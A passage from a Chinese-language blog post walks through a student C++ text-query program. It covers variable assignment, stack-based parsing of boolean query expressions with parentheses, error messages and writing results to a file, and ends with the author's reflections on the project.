class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line">shared_ptr&lt;IFileStream&gt; ifs;</span><br><span class="line">shared_ptr&lt;FileFormatter&gt; ff;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BlankFliter</span><span class="params">(string &amp;str)</span><span class="comment">//使用C++string类的方法快速删除空格</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//std::remove_if函数用于将所有空白字符移动到字符串的末尾，</span></span><br><span class="line">    <span class="comment">//然后使用erase函数将它们从字符串中删除。</span></span><br><span class="line">    <span class="comment">//::isspace函数是一个标准库函数，用于检查一个字符是否为空白字符。</span></span><br><span class="line">    str.<span class="built_in">erase</span>(std::<span class="built_in">remove_if</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>(), ::isspace), str.<span class="built_in">end</span>()); </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExpTraslate</span><span class="params">(string &amp;buf)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">IsNameReturn</span><span class="params">(string &amp;buf)</span></span>&#123;<span class="comment">//针对一个单词的一次性检查</span></span><br><span class="line">    string result;</span><br><span class="line">    <span class="keyword">auto</span> iter = umap.<span class="built_in">find</span>(buf);</span><br><span class="line">    <span class="keyword">if</span>(iter!=umap.<span class="built_in">end</span>())&#123;</span><br><span class="line">        result=iter-&gt;second;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StringTraslate</span><span class="params">(string &amp;buf)</span><span class="comment">//处理用户输入的字符串</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//首先判断是否执行 查询操作</span></span><br><span class="line">    <span class="keyword">if</span>(buf[<span class="number">0</span>]==<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">        buf.<span class="built_in">erase</span>(buf.<span class="built_in">begin</span>());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//然后判断是否执行 赋值 操作</span></span><br><span class="line">    <span class="type">int</span> temp=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> times=<span class="number">0</span>;</span><br><span class="line">    string name,value;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buf.<span class="built_in">size</span>()<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;&gt;&#x27;</span>&amp;&amp;buf[i+<span class="number">1</span>]==<span class="string">&#x27;&gt;&#x27;</span>)&#123;  </span><br><span class="line">            filename=buf.<span class="built_in">substr</span>(i+<span class="number">2</span>,buf.<span class="built_in">size</span>()-i<span class="number">-2</span>);</span><br><span class="line">            buf=buf.<span class="built_in">substr</span>(<span class="number">0</span>,i);<span class="comment">//前面是查询的单词</span></span><br><span class="line">            filesearch=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;buf.<span class="built_in">length</span>();i++)&#123;<span class="comment">//跳过第一个字符，检查是否有赋值操作</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;buf.<span class="built_in">length</span>();j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(buf[j]==<span class="string">&#x27;\&quot;&#x27;</span>&amp;&amp;times==<span class="number">0</span>)&#123;<span class="comment">//找到&quot;说明是常量</span></span><br><span class="line">                    temp=j+<span class="number">1</span>;</span><br><span class="line">                    times++;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(buf[j]==<span class="string">&#x27;\&quot;&#x27;</span>&amp;&amp;times==<span class="number">1</span>)&#123;</span><br><span class="line">                    value=buf.<span class="built_in">substr</span>(temp,j-temp);</span><br><span class="line">                    times++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j==buf.<span class="built_in">length</span>()<span class="number">-1</span>)&#123;<span class="comment">//找到最后一位的时候，说明这可能是个变量</span></span><br><span class="line">                    string qwq=buf.<span class="built_in">substr</span>(temp,j-temp);</span><br><span class="line">                    <span class="keyword">auto</span> iter = umap.<span class="built_in">find</span>(qwq);</span><br><span class="line">                    <span class="keyword">if</span>(iter!=umap.<span class="built_in">end</span>())&#123;</span><br><span class="line">                        value=iter-&gt;second;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        cerr&lt;&lt;<span class="string">&quot;输入了一个不存在的变量，如果需要输入常量abcd，请用\&quot;abcd\&quot;包裹常量abcd :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(times%<span class="number">2</span>)&#123;</span><br><span class="line">                cerr&lt;&lt;<span class="string">&quot;请确保\&quot;abcd\&quot;包裹常量abcd :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">            name=buf.<span class="built_in">substr</span>(<span class="number">0</span>,i);</span><br><span class="line">            umap[name]=value;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//执行表达式处理操作 操作分为分割和计算</span></span><br><span class="line">    <span class="built_in">ExpTraslate</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isOperater</span><span class="params">(string str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(str==<span class="string">&quot;|&quot;</span>||str==<span class="string">&quot;&amp;&quot;</span>||str==<span class="string">&quot;~&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Precedence</span><span class="params">(<span class="type">char</span> op)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&#x27;~&#x27;</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&#x27;&amp;&#x27;</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&#x27;|&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExpTraslate</span><span class="params">(string &amp;buf)</span></span>&#123;<span class="comment">//可能出现错误，可以尝试异常处理</span></span><br><span class="line">    stack&lt;shared_ptr&lt;Query&gt;&gt; qstack;</span><br><span class="line">    stack&lt;<span class="type">char</span>&gt; opstack;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line">    vector&lt;string&gt; backexp;</span><br><span class="line">    <span class="type">int</span> word_start=<span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> last_right=buf[buf.<span class="built_in">size</span>()<span class="number">-1</span>]==<span class="string">&#x27;)&#x27;</span>;<span class="comment">//看在最后一个是不是右边括号</span></span><br><span class="line">    <span class="type">bool</span> Had_op=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> priority1;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buf.<span class="built_in">size</span>();i++)&#123;<span class="comment">//分割字符串并转成后缀表达式</span></span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;~&#x27;</span>||buf[i]==<span class="string">&#x27;|&#x27;</span>||buf[i]==<span class="string">&#x27;&amp;&#x27;</span>||buf[i]==<span class="string">&#x27;(&#x27;</span>||buf[i]==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">            Had_op=<span class="number">1</span>;</span><br><span class="line">            op=buf[i];</span><br><span class="line">            priority1=<span class="built_in">Precedence</span>(op);</span><br><span class="line">            <span class="keyword">if</span> (opstack.<span class="built_in">empty</span>()||op==<span class="string">&#x27;(&#x27;</span>)&#123;<span class="comment">//或者左括号直接压栈</span></span><br><span class="line">                opstack.<span class="built_in">push</span>(op);</span><br><span class="line">                <span class="keyword">if</span>(i-word_start&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    backexp.<span class="built_in">push_back</span>(buf.<span class="built_in">substr</span>(word_start,i-word_start));</span><br><span class="line">                &#125;</span><br><span class="line">                word_start=i+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(op ==<span class="string">&#x27;)&#x27;</span>)&#123;<span class="comment">//如果当前位置是右括号</span></span><br><span class="line">                <span class="keyword">if</span>(i-word_start&gt;<span class="number">0</span>)&#123;<span class="comment">//排除()遇到)的情况</span></span><br><span class="line">                    backexp.<span class="built_in">push_back</span>(buf.<span class="built_in">substr</span>(word_start,i-word_start));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(!opstack.<span class="built_in">empty</span>()&amp;&amp;opstack.<span class="built_in">top</span>()!=<span class="string">&#x27;(&#x27;</span>)&#123;<span class="comment">// 不断将栈中的元素弹出，直到遇到左括号</span></span><br><span class="line">                    <span class="function">string <span class="title">tempop</span><span class="params">(<span class="number">1</span>,opstack.top())</span></span>;</span><br><span class="line">                    opstack.<span class="built_in">pop</span>();</span><br><span class="line">                    backexp.<span class="built_in">push_back</span>(tempop);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!opstack.<span class="built_in">empty</span>()&amp;&amp;opstack.<span class="built_in">top</span>()==<span class="string">&#x27;(&#x27;</span>)&#123;<span class="comment">//遇到左括号就将他弹出</span></span><br><span class="line">                    opstack.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;表达式括号不匹配，请检查并重启程序 :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                word_start=i+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="string">&#x27;~&#x27;</span>||op==<span class="string">&#x27;|&#x27;</span>||op==<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(i-word_start&gt;<span class="number">0</span>)&#123;<span class="comment">//排除(~a)遇到~的情况</span></span><br><span class="line">                    backexp.<span class="built_in">push_back</span>(buf.<span class="built_in">substr</span>(word_start,i-word_start));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>((!opstack.<span class="built_in">empty</span>())&amp;&amp;(<span class="built_in">Precedence</span>(opstack.<span class="built_in">top</span>())&gt;=priority1))&#123;</span><br><span class="line">                    <span class="comment">// 如果栈不空，栈顶为运算符，并且栈顶运算符的优先级大于等于当前运算符的优先级</span></span><br><span class="line">                    <span class="function">string <span class="title">tempop</span><span class="params">(<span class="number">1</span>,opstack.top())</span></span>;</span><br><span class="line">                    opstack.<span class="built_in">pop</span>();</span><br><span class="line">                    backexp.<span class="built_in">push_back</span>(tempop);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//再将操作符压入栈</span></span><br><span class="line">                opstack.<span class="built_in">push</span>(op);</span><br><span class="line">                word_start=i+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="comment">//清空栈，放到后缀表达式</span></span><br><span class="line">    <span class="keyword">if</span>(!last_right)&#123;</span><br><span class="line">        backexp.<span class="built_in">push_back</span>(buf.<span class="built_in">substr</span>(word_start,buf.<span class="built_in">size</span>()-word_start));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!opstack.<span class="built_in">empty</span>())&#123;<span class="comment">//如果op栈不空，弹出所有元素到后缀表达式</span></span><br><span class="line">        <span class="function">string <span class="title">tempop</span><span class="params">(<span class="number">1</span>,opstack.top())</span></span>;</span><br><span class="line">        opstack.<span class="built_in">pop</span>();</span><br><span class="line">        backexp.<span class="built_in">push_back</span>(tempop);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!Had_op)&#123;<span class="comment">//没有运算符，直接走捷径</span></span><br><span class="line">        <span class="function">Query <span class="title">onetime</span><span class="params">(IsNameReturn(buf))</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(filesearch)&#123;</span><br><span class="line">            <span class="function">OFileStream <span class="title">ofi</span><span class="params">(filename)</span></span>;</span><br><span class="line">            cout&lt;&lt;onetime.<span class="built_in">rep</span>()&lt;&lt;endl;</span><br><span class="line">            </span><br><span class="line">            onetime.<span class="built_in">eval</span>(<span class="built_in">TextQuery</span>(ifs-&gt;<span class="built_in">getifsteram</span>())).<span class="built_in">write</span>(ofi.<span class="built_in">getofsteram</span>());</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cout&lt;&lt;onetime.<span class="built_in">rep</span>()&lt;&lt;endl;</span><br><span class="line">            onetime.<span class="built_in">eval</span>(<span class="built_in">TextQuery</span>(ifs-&gt;<span class="built_in">getifsteram</span>())).<span class="built_in">print</span>();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果有运算符，都在栈里面</span></span><br><span class="line">    <span class="keyword">while</span>(!backexp.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isOperater</span>(backexp.<span class="built_in">front</span>()))<span class="comment">//判断向量backexp里面的是不是运算符</span></span><br><span class="line">        &#123;</span><br><span class="line">            string opstr=backexp.<span class="built_in">front</span>();</span><br><span class="line">            <span class="keyword">if</span>(opstr==<span class="string">&quot;|&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(qstack.<span class="built_in">size</span>()&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;表达式所需要的操作数不够... :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">                shared_ptr&lt;Query&gt; temp1=qstack.<span class="built_in">top</span>();</span><br><span class="line">                <span class="comment">//temp1=qstack.top();</span></span><br><span class="line">                qstack.<span class="built_in">pop</span>();</span><br><span class="line">                shared_ptr&lt;Query&gt; temp2=qstack.<span class="built_in">top</span>(); </span><br><span class="line">                qstack.<span class="built_in">pop</span>();</span><br><span class="line">                shared_ptr&lt;Query&gt; result=<span class="built_in">make_shared</span>&lt;Query&gt;(*temp1.<span class="built_in">get</span>()|*temp2.<span class="built_in">get</span>());</span><br><span class="line">                qstack.<span class="built_in">push</span>(result);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(opstr==<span class="string">&quot;&amp;&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(qstack.<span class="built_in">size</span>()&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;表达式所需要的操作数不够... :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                    <span class="keyword">return</span> ;  </span><br><span class="line">                &#125;</span><br><span class="line">                shared_ptr&lt;Query&gt; temp1=qstack.<span class="built_in">top</span>();</span><br><span class="line">                <span class="comment">//temp1=qstack.top();</span></span><br><span class="line">                qstack.<span class="built_in">pop</span>();</span><br><span class="line">                shared_ptr&lt;Query&gt; temp2=qstack.<span class="built_in">top</span>();</span><br><span class="line">                qstack.<span class="built_in">pop</span>();</span><br><span class="line">                shared_ptr&lt;Query&gt; result=<span class="built_in">make_shared</span>&lt;Query&gt;(*temp1.<span class="built_in">get</span>()&amp;*temp2.<span class="built_in">get</span>());</span><br><span class="line">                qstack.<span class="built_in">push</span>(result);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(opstr==<span class="string">&quot;~&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(qstack.<span class="built_in">size</span>()&lt;<span class="number">1</span>)&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;表达式所需要的操作数不够... :(&quot;</span>&lt;&lt;endl ; </span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">                shared_ptr&lt;Query&gt; temp=qstack.<span class="built_in">top</span>();</span><br><span class="line">                qstack.<span class="built_in">pop</span>();</span><br><span class="line">                shared_ptr&lt;Query&gt; result=<span class="built_in">make_shared</span>&lt;Query&gt;(~(*temp.<span class="built_in">get</span>()));</span><br><span class="line">                qstack.<span class="built_in">push</span>(result);</span><br><span class="line">            &#125;</span><br><span class="line">            backexp.<span class="built_in">erase</span>(backexp.<span class="built_in">begin</span>());</span><br><span class="line">        &#125;<span class="comment">//如果不是则执行下面，将Query对象入栈</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            qstack.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;Query&gt;(<span class="built_in">IsNameReturn</span>(backexp.<span class="built_in">front</span>())));<span class="comment">//栈里面的都是共享指针</span></span><br><span class="line">            backexp.<span class="built_in">erase</span>(backexp.<span class="built_in">begin</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后所有运算操作完成</span></span><br><span class="line">    <span class="keyword">if</span>(qstack.<span class="built_in">size</span>()==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(filesearch)&#123;</span><br><span class="line">            <span class="function">OFileStream <span class="title">ofi</span><span class="params">(filename)</span></span>;</span><br><span class="line">            qstack.<span class="built_in">top</span>()-&gt;<span class="built_in">eval</span>(<span class="built_in">TextQuery</span>(ifs-&gt;<span class="built_in">getifsteram</span>())).<span class="built_in">write</span>(ofi.<span class="built_in">getofsteram</span>());</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            qstack.<span class="built_in">top</span>()-&gt;<span class="built_in">eval</span>(<span class="built_in">TextQuery</span>(ifs-&gt;<span class="built_in">getifsteram</span>())).<span class="built_in">print</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        cerr&lt;&lt;<span class="string">&quot;表达式可能出现错误，无法运算出唯一结果&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LFdEA">解析需求6</h3><p>:::info<br><font style="color:rgb(0,0,0);">文本查询功能可以通过交互式的方式保存用户输入的</font><strong><font style="color:rgb(0,0,0);">字符串</font></strong><font style="color:rgb(0,0,0);">（与项目二一样，忽略输入时 </font></p><p><font style="color:rgb(0,0,0);">的各种空格），并可以支持逻辑查询操作（各种逻辑运算）。</font><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704523808550-09f668af-a43d-4bb2-a0d5-2118441545ce.png"><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704523766560-fd64c2bb-e889-4f77-9423-6c76ff93fe72.png"><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704523843712-98b9fd63-9d0f-4ec7-9376-6f072db8fd50.png"></p><p>:::</p><p>还是老样子涉及到unordered_map</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">unordered_map&lt;string,string&gt;umap&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">string <span class="title">IsNameReturn</span><span class="params">(string &amp;buf)</span></span>&#123;<span class="comment">//针对一个单词的一次性检查是否是变量</span></span><br><span class="line">    string result;</span><br><span class="line">    <span class="keyword">auto</span> iter = umap.<span class="built_in">find</span>(buf);</span><br><span class="line">    <span class="keyword">if</span>(iter!=umap.<span class="built_in">end</span>())&#123;</span><br><span class="line">        result=iter-&gt;second;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="nUiFV">解析需求7</h3><p>:::info<br><font style="color:rgb(0,0,0);">7. 要能够打印各种错误信息，比如用户输入不符合规范时。</font></p><p>:::</p><p>OFileStream和IFileStream里面都有对应的错误异常处理</p><p>输入的路径有问题，就返回主函数重新执行菜单</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704540735494-f2cedcc8-0f5a-4de1-876b-55eb3a88d8ae.png"></p><p>输入的查询表达式有问题，返回主函数</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704541429865-d1f0af06-56a1-4acd-aee2-b382fbf76e76.png"><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704540889279-4f1ec330-28f5-402e-b8d2-ae3716d72008.png"></p><h3 id="wWtmc">解析需求9</h3><p>:::info<br><font style="color:rgb(0,0,0);">9. </font><font style="color:rgb(0,0,0);">尝试支持带括号控制优先级的复杂运算（优先级参照</font><font style="color:rgb(0,0,0);">C++</font><font style="color:rgb(0,0,0);">运算符优先级），如 </font></p><p><font style="color:rgb(0,0,0);">&gt;&gt;&gt; ((~a | b &amp; c) | d) &amp; d</font></p><p>:::</p><p>利用栈就可以实现复杂表达式的运算，就是优先级的问题。代码在需求5已经贴出</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704540714628-b25c6efc-db46-4184-94bb-ab1cb59a1d3e.png"></p><h3 id="Hn8Uf">解析需求11</h3><p>可以看到能够成功写到文件中，其实就是字符串处理操作中，根据&gt;&gt;分割成前后部分，后面打开文件即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">QueryResult</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        string inputword;<span class="comment">//需要查询的单词</span></span><br><span class="line">        shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; idx;<span class="comment">//出现的行号</span></span><br><span class="line">        shared_ptr&lt;vector&lt;string&gt;&gt; file;<span class="comment">//查找的文件</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">write</span><span class="params">(ofstream&amp; ofs)</span></span>&#123;</span><br><span class="line">        ofs&lt;&lt;<span class="string">&quot;\&quot;&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;inputword&lt;&lt;<span class="string">&quot;\&quot;出现了&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;idx-&gt;<span class="built_in">size</span>()&lt;&lt;<span class="string">&quot;次&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> num:*(<span class="keyword">this</span>-&gt;idx))&#123;</span><br><span class="line">            ofs&lt;&lt;<span class="string">&quot; (line &quot;</span>&lt;&lt;num+<span class="number">1</span>&lt;&lt;<span class="string">&quot;) &quot;</span>;</span><br><span class="line">            ofs&lt;&lt;*(<span class="keyword">this</span>-&gt;file-&gt;<span class="built_in">begin</span>()+num)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">..........</span><br><span class="line">    ...........</span><br><span class="line">    .........</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704542200925-6309bb02-72a2-430d-9780-4e2f5de6cd5d.png"></p><h1 id="p9gkH"><font style="color:rgb(0,0,0);">总结</font></h1><p>算是比较正常的完成了一个程序，有了正确的思路和设计方向就是省了很多纠错的时间，对类和对象的印象更加深刻了，以及多态继承等概念，还有共享指针的妙处就是跨越{}作用域给你传输数据。解决了上次没有解决复杂表达式的问题，果然还是直接设计面向对象的栈类型是最佳的，以及重载需要的操作符，让我们更加方便的对对象进行操作。复习了RAII和异常处理类操作，没有用上模板但是没关系，也不强求，看需求。</p><p>不足之处感觉就是没有完成所有任务，感觉还是自己不够下功夫。</p><p>看了C++prinmer的相关章节，认识到自己还是需要看一遍这本书的，对于内存操作感觉还是有点陌生，以及共享指针的用处，看了才知道怎么用。</p><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 